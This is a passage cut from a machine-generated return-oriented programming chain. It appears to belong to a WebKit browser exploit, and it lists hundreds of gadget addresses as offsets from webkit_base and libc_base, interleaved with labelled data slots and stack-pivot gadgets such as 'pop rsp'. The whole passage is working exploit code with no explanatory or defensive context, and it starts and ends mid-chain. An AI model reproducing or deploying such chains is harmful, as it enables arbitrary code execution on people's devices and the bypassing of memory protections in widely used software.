webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1463:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121400, //L1466
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1465:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+121488, //L1467
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121504, //L1469
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121648, //L1472
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121616, //L1470
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+121632, //L1471
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121720, //L1473
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+121776, //L1476
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1476:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+121856, //L1477
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1477:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1478:
db([32, 0]); // 0x20
set_gadget(libc_base+792472,); //pop rcx
//L1479:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+121960, //L1480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+121976, //L1481
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+122064, //L1482
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122120, //L1485
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1485:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122192, //L1486
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1486:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122248, //L1489
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1489:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122352, //L1492
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1491:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1492:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+122440, //L1493
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122456, //L1495
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1495:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+122600, //L1498
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122568, //L1496
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+122584, //L1497
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+122672, //L1499
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+122728, //L1502
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1502:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+122808, //L1503
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1503:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1504:
db([37, 0]); // 0x25
set_gadget(libc_base+792472,); //pop rcx
//L1505:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+122912, //L1506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+122928, //L1507
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123016, //L1508
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1508:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123072, //L1511
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1511:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123192, //L1514
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1513:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1514:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+123280, //L1515
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123296, //L1517
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1515:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1517:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123440, //L1520
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123408, //L1518
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+123424, //L1519
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123512, //L1521
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+123568, //L1524
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1524:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+123648, //L1525
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1525:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1526:
db([33, 0]); // 0x21
set_gadget(libc_base+792472,); //pop rcx
//L1527:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+123752, //L1528
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+123768, //L1529
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+123856, //L1530
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+123912, //L1533
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1533:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+123984, //L1534
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1534:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124040, //L1537
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1537:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1538:
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124192, //L1541
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1540:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1541:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+124280, //L1542
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124296, //L1544
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1542:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1544:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124440, //L1547
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124408, //L1545
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+124424, //L1546
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1545:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1546:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1547:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124512, //L1548
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1548:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+124568, //L1551
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1551:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+124648, //L1552
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1552:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1553:
db([34, 0]); // 0x22
set_gadget(libc_base+792472,); //pop rcx
//L1554:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+124752, //L1555
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+124768, //L1556
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1555:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1556:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+124856, //L1557
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1557:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+124912, //L1560
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1560:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+124984, //L1561
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1561:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125040, //L1564
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1564:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1565:
libc_base+811575, //pop rsp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125192, //L1568
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1567:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+125280, //L1569
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125296, //L1571
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1569:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1571:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125440, //L1574
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125408, //L1572
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+125424, //L1573
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125512, //L1575
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1575:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+125568, //L1578
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1578:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+125648, //L1579
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1579:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1580:
db([35, 0]); // 0x23
set_gadget(libc_base+792472,); //pop rcx
//L1581:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+125752, //L1582
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+125768, //L1583
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+125856, //L1584
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1584:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+125912, //L1587
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1587:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+125984, //L1588
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126040, //L1591
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1591:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126144, //L1594
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1593:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1594:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126232, //L1595
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126248, //L1597
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1595:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1597:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126392, //L1600
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126360, //L1598
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126376, //L1599
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126488, //L1603
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1602:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+126576, //L1604
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126592, //L1606
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1604:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1606:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+126736, //L1609
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126704, //L1607
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+126720, //L1608
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+126808, //L1610
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1610:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+126864, //L1613
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1613:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+126944, //L1614
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1614:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1615:
db([36, 0]); // 0x24
set_gadget(libc_base+792472,); //pop rcx
//L1616:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+127048, //L1617
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+127064, //L1618
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+127152, //L1619
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1619:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127208, //L1622
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1622:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127280, //L1623
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1623:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127336, //L1626
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1626:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
